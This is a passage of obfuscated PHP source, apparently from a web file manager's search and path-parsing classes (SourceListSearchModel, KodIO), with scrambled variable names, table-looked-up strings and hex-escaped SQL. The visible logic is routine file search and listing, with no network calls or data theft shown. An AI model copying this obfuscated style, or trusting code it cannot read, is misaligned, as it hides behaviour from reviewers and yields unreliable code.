$ê¤ªÎ”))->save($ÚèáÏ¹ê); return $this->where(array($ËœèéüÇ[457] => $Õ„ŠØı¥))->delete(); } public function clearSame($ôí‚¨å) { $¸§¿¼µë =& $_SERVER[”ú…±Ú¥]; $”îåœ©  = $this->listData($ôí‚¨å); $öœÂİ“ = array_to_keyvalue_group($”îåœ© , $¸§¿¼µë[506]); $ŠÛ¾¿Í« = array(); $øÀÆ¼ÉÄ = array(); foreach ($öœÂİ“ as $äáÂ¤ùÜ) { if (!$äáÂ¤ùÜ || count($äáÂ¤ùÜ) <= 1) { continue; } foreach ($äáÂ¤ùÜ as $ÎÕØşöØ) { $ŠÛ¾¿Í«[] = $ÎÕØşöØ[$¸§¿¼µë[506]]; $øÀÆ¼ÉÄ[] = $ÎÕØşöØ[$¸§¿¼µë[437]]; } } if (!$øÀÆ¼ÉÄ) { return; } $this->where(array($¸§¿¼µë[437] => array($¸§¿¼µë[7], $øÀÆ¼ÉÄ)))->delete(); Model($¸§¿¼µë[509])->remove($ŠÛ¾¿Í«); } public function userSpace() { $¨î¢òãş =& $_SERVER[”ú…±Ú¥]; $îÎÜ…è = $this->tablePrefix; $ÁÏ²ñäê = array($¨î¢òãş[1662] => USER_ID); $È‘Ç¿¯¿ = "{$îÎÜ…è}\x69\x6f\137\146\151\154\x65\40\146\x69\x6c\145\x73\40\157\x6e\40\x66\151\x6c\x65\163\56\x66\151\154\x65\111\104\x20\75\x20\x68\x69\163\x74\157\162\x79\56\146\x69\x6c\145\111\x44"; return $this->alias($¨î¢òãş[2114])->where($ÁÏ²ñäê)->join($È‘Ç¿¯¿, $¨î¢òãş[2115])->sum($¨î¢òãş[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ò Š¢‚Ó) { $™°¯× =& $_SERVER[”ú…±Ú¥]; $‰Şó“ôÌ = KodIO::fileTypeList(); $Ú¹Ğõ›Ú = $‰Şó“ôÌ[$ò Š¢‚Ó]; if (!$Ú¹Ğõ›Ú) { return array(); } $éŒîé³® = $Ú¹Ğõ›Ú[$™°¯×[174]]; $ßĞŠÛ­œ = $™°¯×[7]; if (!$Ú¹Ğõ›Ú[$™°¯×[174]]) { $…‡ÍŒ„¯ = array_to_keyvalue($‰Şó“ôÌ, $™°¯×[12], $™°¯×[174]); $éŒîé³® = implode($™°¯×[50], $…‡ÍŒ„¯); $ßĞŠÛ­œ = $™°¯×[2117]; } $èÁååß = explode($™°¯×[50], trim($éŒîé³®, $™°¯×[50])); return array($ßĞŠÛ­œ, $èÁååß); } public function listPathType($ó•»ÒÆ†) { $Òµ°ôş =& $_SERVER[”ú…±Ú¥]; $ôçÎÌæà = $this->fileTypeWhere($ó•»ÒÆ†); if (!$ôçÎÌæà) { return array(); } $çÇª“¡ç = USER_ID; $ÑÍƒËÍ = Model($Òµ°ôş[563])->getInfo($çÇª“¡ç); $ÛÖ…¼‰Ô = array($Òµ°ôş[614] => SourceModel::TYPE_USER, $Òµ°ôş[549] => array($Òµ°ôş[578], $Òµ°ôş[559] . $ÑÍƒËÍ[$Òµ°ôş[87]][$Òµ°ôş[440]] . $Òµ°ôş[579]), $Òµ°ôş[615] => $çÇª“¡ç, $Òµ°ôş[612] => 0, $Òµ°ôş[613] => $ôçÎÌæà); return $this->listSource($ÛÖ…¼‰Ô); } public function listSearch($ªŒ˜ö±, $Òäë¶åé = 300) { $¸á–½§• =& $_SERVER[”ú…±Ú¥]; if (isset($ªŒ˜ö±[$¸á–½§•[1955]]) && $ªŒ˜ö±[$¸á–½§•[1955]]) { $ªŒ˜ö±[$¸á–½§•[1955]] = str_replace($¸á–½§•[422], $¸á–½§•[2118], trim($ªŒ˜ö±[$¸á–½§•[1955]])); } $…ØÂ Ù = $this->_parseSearchWhere($ªŒ˜ö±); if (!isset($…ØÂ Ù[$¸á–½§•[469]])) { $…ØÂ Ù[$¸á–½§•[469]] = 0; } $„òÆ¬åå = $¸á–½§•[2119]; $ô¿á¯Á× = $…ØÂ Ù; $ÈºóÏ = $„òÆ¬åå; $this->_listSearchBindPinyin($ªŒ˜ö±, $…ØÂ Ù, $„òÆ¬åå); $this->alias($¸á–½§•[484])->_makeOrder(); $…ØÂ Ù = $this->parseWhereLike($…ØÂ Ù); $­³‚±ù = $this->distinct(!0)->field($„òÆ¬åå)->where($…ØÂ Ù)->selectPage($Òäë¶åé); if ($GLOBALS[$¸á–½§•[6]][$¸á–½§•[419]][$¸á–½§•[420]] && Input::check($ªŒ˜ö±[$¸á–½§•[1955]], $¸á–½§•[621]) && $­³‚±ù[$¸á–½§•[404]][$¸á–½§•[391]] == 1 && $­³‚±ù[$¸á–½§•[404]][$¸á–½§•[405]] == 0) { $­³‚±ù = $this->distinct(!0)->field($„òÆ¬åå)->where($ô¿á¯Á×)->limit(1000)->select(); $­³‚±ù = array_page_split($­³‚±ù, !1, $Òäë¶åé); } $this->_listSearchFileContent($­³‚±ù, $ªŒ˜ö±, $ÈºóÏ, $ô¿á¯Á×); $this->_listSearchDesc($­³‚±ù, $ªŒ˜ö±, $ÈºóÏ); $this->_listSearchTag($­³‚±ù, $ªŒ˜ö±, $ÈºóÏ); $this->_listSearchGroupTag($­³‚±ù, $ªŒ˜ö±, $ÈºóÏ); $this->_listDataApply($­³‚±ù[$¸á–½§•[407]]); $this->_listMake($­³‚±ù); return $­³‚±ù; } private function _listSearchFileContent(&$¦ËÑÜ˜Ö, $ù¦¼É©¸, $ ÇáÁ˜ª, $Ê¢œÚç) { $Ÿ»÷‰è‹ =& $_SERVER[”ú…±Ú¥]; if (!$ù¦¼É©¸[$Ÿ»÷‰è‹[1955]] || $¦ËÑÜ˜Ö[$Ÿ»÷‰è‹[404]][$Ÿ»÷‰è‹[391]] > 1) { return; } if (!isset($Ê¢œÚç[$Ÿ»÷‰è‹[32]]) || !is_array($ù¦¼É©¸[$Ÿ»÷‰è‹[506]])) { return; } $Ê¢œÚç[$Ÿ»÷‰è‹[506]] = array($Ÿ»÷‰è‹[7], $ù¦¼É©¸[$Ÿ»÷‰è‹[506]]); unset($Ê¢œÚç[$Ÿ»÷‰è‹[32]]); unset($ù¦¼É©¸[$Ÿ»÷‰è‹[506]]); $ä÷ëòºÕ = $this->field($ ÇáÁ˜ª)->where($Ê¢œÚç)->limit($Ÿ»÷‰è‹[2120])->select(); if (!$ä÷ëòºÕ || count($ä÷ëòºÕ) == 0) { return; } $¦ËÑÜ˜Ö[$Ÿ»÷‰è‹[407]] = array_merge($ä÷ëòºÕ, $¦ËÑÜ˜Ö[$Ÿ»÷‰è‹[407]]); $¦ËÑÜ˜Ö[$Ÿ»÷‰è‹[404]][$Ÿ»÷‰è‹[405]] += count($ä÷ëòºÕ); } private function _listSearchTag(&$ŒìºôéÇ, $Ö§öâ‡‡, $Ş‡Î³µæ) { $Ç¥ ğñ =& $_SERVER[”ú…±Ú¥]; if (!$Ö§öâ‡‡[$Ç¥ ğñ[1955]] || $ŒìºôéÇ[$Ç¥ ğñ[404]][$Ç¥ ğñ[391]] > 1) { return; } $Ü¸ß•¹ = Model($Ç¥ ğñ[2121])->listData(); $ı’Ğå£Ù = array(); $­òñ¼– = $Ö§öâ‡‡[$Ç¥ ğñ[1955]]; foreach ($Ü¸ß•¹ as $îñã‰ƒ) { $Úıç¶»º = $îñã‰ƒ[$Ç¥ ğñ[32]]; $Ïêüù¶ = str_replace($Ç¥ ğñ[53], $Ç¥ ğñ[12], Pinyin::get($Úıç¶»º)); if (stripos($Úıç¶»º, $­òñ¼–) !== !1 || stripos($Ïêüù¶, $­òñ¼–) !== !1) { $ı’Ğå£Ù[] = $îñã‰ƒ[$Ç¥ ğñ[437]]; } } if (!$ı’Ğå£Ù) { return; } $¯€µÑ¾ = array($Ç¥ ğñ[464] => array($Ç¥ ğñ[7], $ı’Ğå£Ù), $Ç¥ ğñ[1671] => USER_ID); $ÉŸ¸ïİ• = Model($Ç¥ ğñ[466])->field($Ç¥ ğñ[84])->where($¯€µÑ¾)->select(); $ÉŸ¸ïİ• = array_to_keyvalue($ÉŸ¸ïİ•, $Ç¥ ğñ[12], $Ç¥ ğñ[84]); $´ì¯şÄí = array_unique($ÉŸ¸ïİ•); $this->_listSearchMerge($ŒìºôéÇ, $Ö§öâ‡‡, $Ş‡Î³µæ, $´ì¯şÄí); } private function _listSearchDesc(&$ÜÉ™Ç»’, $¶ÄÑ×ÃÁ, $³ÇÃ¡) { $±Ò‘ Ë =& $_SERVER[”ú…±Ú¥]; if (!$¶ÄÑ×ÃÁ[$±Ò‘ Ë[1955]] || $ÜÉ™Ç»’[$±Ò‘ Ë[404]][$±Ò‘ Ë[391]] > 1) { return; } $û†Æş¦… = array($±Ò‘ Ë[94] => $±Ò‘ Ë[491], $±Ò‘ Ë[412] => array($±Ò‘ Ë[421], $±Ò‘ Ë[1957] . $¶ÄÑ×ÃÁ[$±Ò‘ Ë[1955]] . $±Ò‘ Ë[1957])); $’±³¼ã = !1; if ($’±³¼ã) { $½„»“áú = $this->listSearchChildren($¶ÄÑ×ÃÁ[$±Ò‘ Ë[470]]); $½„»“áú = array_unique($½„»“áú); if (!$½„»“áú) { return; } $û†Æş¦…[$±Ò‘ Ë[440]] = array($±Ò‘ Ë[7], $½„»“áú); } $˜ˆáè‡½ = Model($±Ò‘ Ë[598])->field($±Ò‘ Ë[440])->where($û†Æş¦…)->limit(5000)->select(); $´ŸÉÕç„ = array_to_keyvalue($˜ˆáè‡½, $±Ò‘ Ë[12], $±Ò‘ Ë[440]); $this->_listSearchMerge($ÜÉ™Ç»’, $¶ÄÑ×ÃÁ, $³ÇÃ¡, $´ŸÉÕç„); } private function _listSearchGroupTag(&$ä§ÒÛã§, $†½à°å¸, $ÚÉ¢ÈÏ¹) { $¦í„ö§ =& $_SERVER[”ú…±Ú¥]; if (!$†½à°å¸[$¦í„ö§[1955]] || $ä§ÒÛã§[$¦í„ö§[404]][$¦í„ö§[391]] > 1 || !$†½à°å¸[$¦í„ö§[470]]) { return; } $ù·‰»ú­ = $this->sourceInfo($†½à°å¸[$¦í„ö§[470]]); if (!$ù·‰»ú­ || $ù·‰»ú­[$¦í„ö§[449]] != SourceModel::TYPE_GROUP) { return; } $ğ°îÕ’ = $ù·‰»ú­[$¦í„ö§[534]]; $Á–æÁÈï = Model($¦í„ö§[2122])->get($ğ°îÕ’); $õÀ»Øôõ = array(); $Â‘ì’Í = $†½à°å¸[$¦í„ö§[1955]]; foreach ($Á–æÁÈï[$¦í„ö§[407]] as $éœ¿ÈÉ) { $§Ïûêƒ“ = $éœ¿ÈÉ[$¦í„ö§[32]]; $®‚Ñ—Í = str_replace($¦í„ö§[53], $¦í„ö§[12], Pinyin::get($§Ïûêƒ“)); if (stripos($§Ïûêƒ“, $Â‘ì’Í) !== !1 || stripos($®‚Ñ—Í, $Â‘ì’Í) !== !1) { $õÀ»Øôõ[] = $éœ¿ÈÉ[$¦í„ö§[437]]; } } if (!$õÀ»Øôõ) { return; } $‹‘ÍõÔõ = array($¦í„ö§[464] => array($¦í„ö§[7], $õÀ»Øôõ), $¦í„ö§[1671] => 0, $¦í„ö§[33] => $¦í„ö§[1977] . $ğ°îÕ’); $Ù÷‹Ï¼Ô = Model($¦í„ö§[466])->field($¦í„ö§[84])->where($‹‘ÍõÔõ)->select(); $Ù÷‹Ï¼Ô = array_to_keyvalue($Ù÷‹Ï¼Ô, $¦í„ö§[12], $¦í„ö§[84]); $ãÖ®÷ = array_unique($Ù÷‹Ï¼Ô); $this->_listSearchMerge($ä§ÒÛã§, $†½à°å¸, $ÚÉ¢ÈÏ¹, $ãÖ®÷); } private function _listSearchMerge(&$€àãÙœ, $í—òÏÌã, $‘áß«›à, $–ê„¢İÔ) { $±‰úÕ¡ =& $_SERVER[”ú…±Ú¥]; if (!$–ê„¢İÔ) { return; } $ôñ’¥ = array_to_keyvalue($€àãÙœ[$±‰úÕ¡[407]], $±‰úÕ¡[12], $±‰úÕ¡[440]); $€ÜÈÎÜ = array_diff($–ê„¢İÔ, $ôñ’¥); if (!$€ÜÈÎÜ) { return; } $½şŸ•“ = array($±‰úÕ¡[440] => array($±‰úÕ¡[7], $€ÜÈÎÜ)); $¶‚Ô = $this->field($‘áß«›à)->where($½şŸ•“)->select(); if (!$¶‚Ô) { return; } $®±œ—› = array(); foreach ($¶‚Ô as $ËÀûÍŸ²) { if ($this->_listSearchFilter($ËÀûÍŸ², $í—òÏÌã)) { $®±œ—›[] = $ËÀûÍŸ²; } } $€àãÙœ[$±‰úÕ¡[407]] = array_merge($®±œ—›, $€àãÙœ[$±‰úÕ¡[407]]); $€àãÙœ[$±‰úÕ¡[404]][$±‰úÕ¡[405]] += count($®±œ—›); } private function _listSearchFilter($­‹ŒÈ¢„, $àÊª‚ÒÚ) { $ïú¿ë²Ò =& $_SERVER[”ú…±Ú¥]; $ÚßúôŞğ = $­‹ŒÈ¢„[$ïú¿ë²Ò[448]] == $ïú¿ë²Ò[88]; if (!strstr($­‹ŒÈ¢„[$ïú¿ë²Ò[549]], $ïú¿ë²Ò[50] . $àÊª‚ÒÚ[$ïú¿ë²Ò[470]] . $ïú¿ë²Ò[50])) { return !1; } if (isset($àÊª‚ÒÚ[$ïú¿ë²Ò[450]]) && $àÊª‚ÒÚ[$ïú¿ë²Ò[450]] != $ïú¿ë²Ò[1916]) { if ($àÊª‚ÒÚ[$ïú¿ë²Ò[450]] == $ïú¿ë²Ò[75] && !$ÚßúôŞğ) { return !1; } if ($àÊª‚ÒÚ[$ïú¿ë²Ò[450]] != $ïú¿ë²Ò[75] && $ÚßúôŞğ) { return !1; } if (!strstr($­‹ŒÈ¢„[$ïú¿ë²Ò[174]], $ïú¿ë²Ò[50] . $àÊª‚ÒÚ[$ïú¿ë²Ò[450]] . $ïú¿ë²Ò[50])) { return !1; } } if (isset($àÊª‚ÒÚ[$ïú¿ë²Ò[2123]]) && $àÊª‚ÒÚ[$ïú¿ë²Ò[2123]] < $­‹ŒÈ¢„[$ïú¿ë²Ò[76]]) { return !1; } if (isset($àÊª‚ÒÚ[$ïú¿ë²Ò[2124]]) && $àÊª‚ÒÚ[$ïú¿ë²Ò[2124]] > $­‹ŒÈ¢„[$ïú¿ë²Ò[76]]) { return !1; } if (isset($àÊª‚ÒÚ[$ïú¿ë²Ò[628]]) && $àÊª‚ÒÚ[$ïú¿ë²Ò[628]] != $­‹ŒÈ¢„[$ïú¿ë²Ò[494]]) { return !1; } return !0; } public function listSearchChildren($şö—®Ãº, $ë«ú¡­Ç = 5000) { $çÏÏõÉ =& $_SERVER[”ú…±Ú¥]; $ó¯ûÁ¡¢ = array(); $çÙı­ÁÅ = $this->sourceInfo($şö—®Ãº); $ˆèŒ°¨ë = array($çÏÏõÉ[549] => array($çÏÏõÉ[421], $çÙı­ÁÅ[$çÏÏõÉ[549]] . $çÙı­ÁÅ[$çÏÏõÉ[440]] . $çÏÏõÉ[579])); $Õê÷¾ = $this->field($çÏÏõÉ[76])->where($ˆèŒ°¨ë)->limit($ë«ú¡­Ç + 1)->select(); $ŸŸõ‚ = is_array($Õê÷¾) ? count($Õê÷¾) : 0; if ($ŸŸõ‚ > $ë«ú¡­Ç) { return $this->_listSearchChildrenNear($şö—®Ãº, $ë«ú¡­Ç); } $¨§Ùúùä = $this->field($çÏÏõÉ[440])->where($ˆèŒ°¨ë)->select(); $ó¯ûÁ¡¢ = array_to_keyvalue($¨§Ùúùä, $çÏÏõÉ[12], $çÏÏõÉ[440]); return $ó¯ûÁ¡¢; } private function _listSearchChildrenNear($ãİĞàå, $Î²î¬üø) { $íÔ‰¯Ğå =& $_SERVER[”ú…±Ú¥]; $¡­ÏŒ½ø = array(); $ç®²­ãª = array($íÔ‰¯Ğå[470] => $ãİĞàå); $ûåúäİĞ = $this->field($íÔ‰¯Ğå[2125])->where($ç®²­ãª)->select(); $ËŸ¼Êëî = array_to_keyvalue(array_filter_by_field($ûåúäİĞ, $íÔ‰¯Ğå[448], $íÔ‰¯Ğå[88]), $íÔ‰¯Ğå[12], $íÔ‰¯Ğå[440]); $¡­ÏŒ½ø = array_merge($¡­ÏŒ½ø, array_to_keyvalue($ûåúäİĞ, $íÔ‰¯Ğå[12], $íÔ‰¯Ğå[440])); if (!$ËŸ¼Êëî) { return $¡­ÏŒ½ø; } $ç®²­ãª = array($íÔ‰¯Ğå[470] => array($íÔ‰¯Ğå[7], $ËŸ¼Êëî)); $ûåúäİĞ = $this->field($íÔ‰¯Ğå[2125])->where($ç®²­ãª)->limit($Î²î¬üø)->select(); $¡­ÏŒ½ø = array_merge($¡­ÏŒ½ø, array_to_keyvalue($ûåúäİĞ, $íÔ‰¯Ğå[12], $íÔ‰¯Ğå[440])); $¡­ÏŒ½ø = array_slice($¡­ÏŒ½ø, 0, $Î²î¬üø); return $¡­ÏŒ½ø; } private function _listSearchBindPinyin($à˜‡íö², &$˜Ÿ²Ä˜â, &$úØü‡ÔÔ) { $ÈÛ«òâÒ =& $_SERVER[”ú…±Ú¥]; if (!isset($à˜‡íö²[$ÈÛ«òâÒ[1955]]) || !$à˜‡íö²[$ÈÛ«òâÒ[1955]]) { return; } if (!Input::check($à˜‡íö²[$ÈÛ«òâÒ[1955]], $ÈÛ«òâÒ[356]) || strlen($à˜‡íö²[$ÈÛ«òâÒ[1955]]) < 2) { return; } $©¸¹¿»Î = "\x4c\x45\x46\124\40\112\117\111\116\x20{$this->tablePrefix}\151\157\137\163\x6f\165\x72\143\145\x5f\x6d\x65\164\x61\40\x6d\145\x74\x61\40\157\156\x20\163\157\165\x72\x63\x65\56\163\157\165\162\143\145\111\x44\40\x3d\x20\155\x65\164\141\x2e\x73\157\165\x72\143\x65\x49\104"; $š“ã‘Ö­ = array(); $úØü‡ÔÔ = str_replace(array($ÈÛ«òâÒ[191], $ÈÛ«òâÒ[53], $ÈÛ«òâÒ[2126]), $ÈÛ«òâÒ[12], $úØü‡ÔÔ); $úØü‡ÔÔ = $ÈÛ«òâÒ[476] . str_replace($ÈÛ«òâÒ[50], $ÈÛ«òâÒ[477], $úØü‡ÔÔ); $Œıêñéâ = $˜Ÿ²Ä˜â[$ÈÛ«òâÒ[32]]; unset($˜Ÿ²Ä˜â[$ÈÛ«òâÒ[32]]); foreach ($˜Ÿ²Ä˜â as $×Âé¿‚é => $ıÑğŠ›©) { $š“ã‘Ö­[$ÈÛ«òâÒ[476] . $×Âé¿‚é] = $ıÑğŠ›©; } foreach ($Œıêñéâ as $ûØ÷ÃÎ) { $š“ã‘Ö­[] = array($ÈÛ«òâÒ[481] => $ûØ÷ÃÎ, $ÈÛ«òâÒ[1029] => $ÈÛ«òâÒ[1959], array($ÈÛ«òâÒ[2127] => $ûØ÷ÃÎ, $ÈÛ«òâÒ[2128] => array($ÈÛ«òâÒ[7], array($ÈÛ«òâÒ[503], $ÈÛ«òâÒ[502])))); } $this->join($©¸¹¿»Î); $˜Ÿ²Ä˜â = $š“ã‘Ö­; } private function _parseSearchWhere($¯ÊÆé¯Ì) { $ª»–²³µ =& $_SERVER[”ú…±Ú¥]; $Ÿ÷éÆ¥‚ = array(); if (isset($¯ÊÆé¯Ì[$ª»–²³µ[792]]) && $¯ÊÆé¯Ì[$ª»–²³µ[792]]) { $Ÿ÷éÆ¥‚[$ª»–²³µ[85]] = array($ª»–²³µ[2129], $¯ÊÆé¯Ì[$ª»–²³µ[792]]); } if (isset($¯ÊÆé¯Ì[$ª»–²³µ[793]]) && $¯ÊÆé¯Ì[$ª»–²³µ[793]]) { $¾»«™ßï = array($ª»–²³µ[2130], $¯ÊÆé¯Ì[$ª»–²³µ[793]]); if ($Ÿ÷éÆ¥‚[$ª»–²³µ[85]]) { $Ÿ÷éÆ¥‚[$ª»–²³µ[85]] = array($Ÿ÷éÆ¥‚[$ª»–²³µ[85]], $¾»«™ßï, $ª»–²³µ[2131]); } else { $Ÿ÷éÆ¥‚[$ª»–²³µ[85]] = $¾»«™ßï; } } if (isset($¯ÊÆé¯Ì[$ª»–²³µ[2123]]) && $¯ÊÆé¯Ì[$ª»–²³µ[2123]] > 0) { $Ÿ÷éÆ¥‚[$ª»–²³µ[76]] = array($ª»–²³µ[2129], $¯ÊÆé¯Ì[$ª»–²³µ[2123]]); } if (isset($¯ÊÆé¯Ì[$ª»–²³µ[2124]]) && $¯ÊÆé¯Ì[$ª»–²³µ[2124]]) { $¾»«™ßï = array($ª»–²³µ[2130], $¯ÊÆé¯Ì[$ª»–²³µ[2124]]); if ($Ÿ÷éÆ¥‚[$ª»–²³µ[76]]) { $Ÿ÷éÆ¥‚[$ª»–²³µ[76]] = array($Ÿ÷éÆ¥‚[$ª»–²³µ[76]], $¾»«™ßï, $ª»–²³µ[2131]); } else { $Ÿ÷éÆ¥‚[$ª»–²³µ[76]] = $¾»«™ßï; } } if (isset($¯ÊÆé¯Ì[$ª»–²³µ[628]]) && $¯ÊÆé¯Ì[$ª»–²³µ[628]]) { $Ÿ÷éÆ¥‚[] = array($ª»–²³µ[494] => $¯ÊÆé¯Ì[$ª»–²³µ[628]], $ª»–²³µ[492] => $¯ÊÆé¯Ì[$ª»–²³µ[628]], $ª»–²³µ[1029] => $ª»–²³µ[1959]); } if (isset($¯ÊÆé¯Ì[$ª»–²³µ[450]]) && $¯ÊÆé¯Ì[$ª»–²³µ[450]]) { $ùë‹‘¢İ = $¯ÊÆé¯Ì[$ª»–²³µ[450]]; if ($ùë‹‘¢İ == $ª»–²³µ[75]) { $Ÿ÷éÆ¥‚[$ª»–²³µ[448]] = 1; } else { if ($ùë‹‘¢İ == $ª»–²³µ[2132]) { $Ÿ÷éÆ¥‚[$ª»–²³µ[448]] = 0; } else { if ($ùë‹‘¢İ) { $ùë‹‘¢İ = is_array($ùë‹‘¢İ) ? $ùë‹‘¢İ : explode($ª»–²³µ[50], $ùë‹‘¢İ); $Ÿ÷éÆ¥‚[$ª»–²³µ[450]] = array($ª»–²³µ[456], $ùë‹‘¢İ); $Ÿ÷éÆ¥‚[$ª»–²³µ[448]] = 0; } } } } $this->_parseSearchParent($¯ÊÆé¯Ì, $Ÿ÷éÆ¥‚); if (isset($¯ÊÆé¯Ì[$ª»–²³µ[1955]]) && trim($¯ÊÆé¯Ì[$ª»–²³µ[1955]])) { $åèî’³Ó = trim($¯ÊÆé¯Ì[$ª»–²³µ[1955]]); $¡²“™Šß = explode($ª»–²³µ[53], $åèî’³Ó); if (strlen($åèî’³Ó) > 2 && (substr($åèî’³Ó, 0, 1) == $ª»–²³µ[118] && substr($åèî’³Ó, -1) == $ª»–²³µ[118]) || substr($åèî’³Ó, 0, 1) == $ª»–²³µ[58] && substr($åèî’³Ó, -1) == $ª»–²³µ[58]) { $åèî’³Ó = substr($åèî’³Ó, 1, -1); $¡²“™Šß = array($åèî’³Ó); } $Ÿ÷éÆ¥‚[$ª»–²³µ[32]] = array(array($ª»–²³µ[578], $ª»–²³µ[1957] . $åèî’³Ó . $ª»–²³µ[1957])); if (count($¡²“™Šß) > 1) { $Ÿ÷éÆ¥‚[$ª»–²³µ[32]] = array(); foreach ($¡²“™Šß as $Í­°£­¦) { if (!trim($Í­°£­¦)) { continue; } $Ÿ÷éÆ¥‚[$ª»–²³µ[32]][] = array($ª»–²³µ[578], $ª»–²³µ[1957] . trim($Í­°£­¦) . $ª»–²³µ[1957]); } } } return $Ÿ÷éÆ¥‚; } private function _parseSearchParent($²¸­´Øï, &$¥øê”š) { $µĞÙæ³ç =& $_SERVER[”ú…±Ú¥]; if (!isset($²¸­´Øï[$µĞÙæ³ç[470]]) || !$²¸­´Øï[$µĞÙæ³ç[470]]) { return; } $É¸”º« = $this->pathInfo($²¸­´Øï[$µĞÙæ³ç[470]]); $ÁáÊ•—· = $É¸”º«[$µĞÙæ³ç[470]] . $µĞÙæ³ç[12] === $µĞÙæ³ç[208]; $´ …Ü¯ = $É¸”º«[$µĞÙæ³ç[449]] == $µĞÙæ³ç[543]; if ($É¸”º«[$µĞÙæ³ç[560]] == $µĞÙæ³ç[561]) { $†÷²ĞÉ„ = $this->sourceInfo($²¸­´Øï[$µĞÙæ³ç[470]]); $É¸”º«[$µĞÙæ³ç[549]] = $†÷²ĞÉ„[$µĞÙæ³ç[549]]; } $¥øê”š[$µĞÙæ³ç[618]] = array($µĞÙæ³ç[578], $É¸”º«[$µĞÙæ³ç[549]] . $²¸­´Øï[$µĞÙæ³ç[470]] . $µĞÙæ³ç[579]); $­àœòÑæ = isset($²¸­´Øï[$µĞÙæ³ç[1820]]) && in_array($µĞÙæ³ç[543], $²¸­´Øï[$µĞÙæ³ç[1820]]); if (!$­àœòÑæ || !$´ …Ü¯ || !$ÁáÊ•—· || !$É¸”º«[$µĞÙæ³ç[451]]) { return; } if (!AuthModel::authCheckRoot($É¸”º«[$µĞÙæ³ç[451]][$µĞÙæ³ç[452]])) { return; } $õ•ë¨Ÿ” = $É¸”º«[$µĞÙæ³ç[534]] . $µĞÙæ³ç[12]; if ($õ•ë¨Ÿ” == $µĞÙæ³ç[88]) { unset($¥øê”š[$µĞÙæ³ç[618]]); $¥øê”š[$µĞÙæ³ç[449]] = self::TYPE_GROUP; return; } $¢›æ‹Ù³ = Model($µĞÙæ³ç[550])->groupChildrenAll($õ•ë¨Ÿ”); $Å‹®ë¶ì = count($¢›æ‹Ù³); if ($Å‹®ë¶ì <= 1) { return; } $¥”õùó¯ = array($µĞÙæ³ç[470] => 0, $µĞÙæ³ç[449] => self::TYPE_GROUP, $µĞÙæ³ç[534] => array($µĞÙæ³ç[7], $¢›æ‹Ù³)); $ò ¦ù‹× = $this->field($µĞÙæ³ç[2133])->where($¥”õùó¯)->limit($Å‹®ë¶ì)->select(); $¥øê”š[$µĞÙæ³ç[618]] = array(); foreach ($ò ¦ù‹× as $÷´ÃÈ¿œ) { $¥øê”š[$µĞÙæ³ç[618]][] = array($µĞÙæ³ç[578], $µĞÙæ³ç[559] . $÷´ÃÈ¿œ[$µĞÙæ³ç[440]] . $µĞÙæ³ç[579]); } $¥øê”š[$µĞÙæ³ç[618]][] = $µĞÙæ³ç[1959]; } } goto Cç ŸÙøàÚ; F¶×„²ô”à: class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\145\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\151\x6c\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\151\154\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\x70\x52\157\157\164\123\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\x53\x68\141\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\111\x74\145\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\122\x65\156\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\166\x65\162\175"; public static function typeList() { $ÇñÈÃôã =& $_SERVER[”ú…±Ú¥]; return array($ÇñÈÃôã[1280] => self::KOD_SOURCE, $ÇñÈÃôã[1281] => self::KOD_USER_RECYCLE, $ÇñÈÃôã[1282] => self::KOD_USER_FAV, $ÇñÈÃôã[1283] => self::KOD_USER_FILE_TAG, $ÇñÈÃôã[1284] => self::KOD_USER_FILE_TYPE, $ÇñÈÃôã[1285] => self::KOD_GROUP_ROOT_SELF, $ÇñÈÃôã[1286] => self::KOD_USER_SHARE, $ÇñÈÃôã[1287] => self::KOD_USER_SHARE_LINK, $ÇñÈÃôã[1288] => self::KOD_USER_SHARE_TO_ME, $ÇñÈÃôã[1289] => self::KOD_SHARE_ITEM, $ÇñÈÃôã[1290] => self::KOD_SHARE_LINK, $ÇñÈÃôã[1291] => self::KOD_SEARCH, $ÇñÈÃôã[1292] => self::KOD_BLOCK, $ÇñÈÃôã[1293] => self::KOD_IO, $ÇñÈÃôã[1294] => self::KOD_USER_RECENT, $ÇñÈÃôã[1295] => self::KOD_USER_DRIVER); } public static function parse($–¥…¨ºÜ) { $ƒ×–ëÖ =& $_SERVER[”ú…±Ú¥]; $–¥…¨ºÜ = self::clear($–¥…¨ºÜ); $¾·¦ª † = array_values(self::typeList()); preg_match($ƒ×–ëÖ[1296], $–¥…¨ºÜ, $¤åŠÎ¥); $ˆù”È· = array($ƒ×–ëÖ[460] => !1, $ƒ×–ëÖ[1297] => !1, $ƒ×–ëÖ[457] => !1, $ƒ×–ëÖ[84] => $–¥…¨ºÜ, $ƒ×–ëÖ[1198] => !1, $ƒ×–ëÖ[1197] => $ƒ×–ëÖ[12]); if (is_array($¤åŠÎ¥) && count($¤åŠÎ¥) == 5) { $¦Ğñ´… = $ƒ×–ëÖ[1298] . $¤åŠÎ¥[2] . $ƒ×–ëÖ[365]; if (in_array($¦Ğñ´…, $¾·¦ª †)) { $ˆù”È·[$ƒ×–ëÖ[1198]] = $¤åŠÎ¥[1]; $ˆù”È·[$ƒ×–ëÖ[33]] = $¦Ğñ´…; $ˆù”È·[$ƒ×–ëÖ[1299]] = substr($¦Ğñ´…, 1, -1); 